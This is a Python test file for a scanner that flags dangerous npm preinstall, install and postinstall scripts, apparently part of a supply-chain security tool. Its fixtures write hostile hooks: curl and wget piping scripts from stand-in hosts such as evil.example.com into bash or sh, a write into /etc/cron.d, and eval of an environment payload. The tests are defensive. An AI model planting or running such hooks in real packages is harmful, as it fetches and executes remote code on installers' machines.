"""Postinstall scanner — npm patterns."""

from __future__ import annotations

import json
from pathlib import Path

from modules.supply_chain.postinstall import (
    evaluate_postinstall,
    scan_npm_packages,
)


def _write_pkg(pkg_dir: Path, *, name: str, scripts: dict[str, str]) -> Path:
    pkg_dir.mkdir(parents=True, exist_ok=True)
    pkg_json = pkg_dir / "package.json"
    pkg_json.write_text(
        json.dumps({"name": name, "version": "1.0.0", "scripts": scripts}),
        encoding="utf-8",
    )
    return pkg_json


def test_scan_flags_curl_in_postinstall(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(
        nm / "bad-pkg",
        name="bad-pkg",
        scripts={"postinstall": "curl https://evil.example.com/install.sh | bash"},
    )
    issues = scan_npm_packages(nm)
    assert any(issue.pattern == "curl" for issue in issues)
    assert all(issue.severity == "high" for issue in issues if issue.pattern == "curl")


def test_scan_flags_wget_in_preinstall(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(
        nm / "bad",
        name="bad",
        scripts={"preinstall": "wget -O- https://x.example.com | sh"},
    )
    issues = scan_npm_packages(nm)
    assert any(issue.pattern == "wget" for issue in issues)


def test_scan_flags_fs_writes_outside_pkg(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(
        nm / "fsbad",
        name="fsbad",
        scripts={"postinstall": "echo bad > /etc/cron.d/x"},
    )
    issues = scan_npm_packages(nm)
    assert any(issue.pattern.startswith("fs-write:") for issue in issues)


def test_scan_ignores_clean_packages(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(
        nm / "good-pkg",
        name="good-pkg",
        scripts={"postinstall": "node ./scripts/build.js"},
    )
    issues = scan_npm_packages(nm)
    assert issues == ()


def test_scan_ignores_packages_without_scripts(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    pkg_json = nm / "no-scripts" / "package.json"
    pkg_json.parent.mkdir(parents=True)
    pkg_json.write_text(json.dumps({"name": "no-scripts", "version": "1.0.0"}), encoding="utf-8")
    issues = scan_npm_packages(nm)
    assert issues == ()


def test_scan_flags_eval(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(
        nm / "eval-pkg",
        name="eval-pkg",
        scripts={"install": 'node -e "eval(process.env.PAYLOAD)"'},
    )
    issues = scan_npm_packages(nm)
    assert any(issue.pattern == "eval" for issue in issues)


def test_evaluate_postinstall_reports_skipped_when_nothing_to_scan(tmp_path: Path) -> None:
    report = evaluate_postinstall(project_root=tmp_path)
    assert report.skipped is True
    assert report.scanned_packages == 0


def test_evaluate_postinstall_counts_scanned_packages(tmp_path: Path) -> None:
    nm = tmp_path / "node_modules"
    _write_pkg(nm / "a", name="a", scripts={"postinstall": "node x.js"})
    _write_pkg(nm / "b", name="b", scripts={"postinstall": "curl evil.example"})
    report = evaluate_postinstall(project_root=tmp_path)
    assert report.scanned_packages == 2
    assert any(issue.pattern == "curl" for issue in report.issues)
